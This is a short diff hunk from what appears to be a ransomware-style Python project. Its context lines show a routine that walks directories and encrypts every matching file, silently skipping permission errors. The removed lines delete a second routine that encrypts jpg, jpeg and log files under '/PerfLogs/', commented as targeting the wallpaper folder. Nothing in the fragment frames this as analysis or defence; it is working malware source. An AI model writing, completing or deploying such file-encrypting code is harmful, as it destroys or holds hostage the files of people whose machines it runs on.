@@ -57,17 +57,3 @@ def filelist():
                             file_ecrypt(key, ally)
                     except PermissionError:
                         pass
-# ENCRYPT THE FOLDER CONTAINS THE WALLPAPER
-def filelist_aux():
-    mylist = ["jpg", "jpeg", "log"]
-    spec = '/PerfLogs/'
-    for root, dirs, files in os.walk(spec):
-        for file in files:
-            for ext in mylist:
-                try:
-                    if file.endswith(ext):
-                        ally = os.path.join(root, file)
-                        print(ally)
-                        file_ecrypt(key, ally)
-                except:
-                    pass
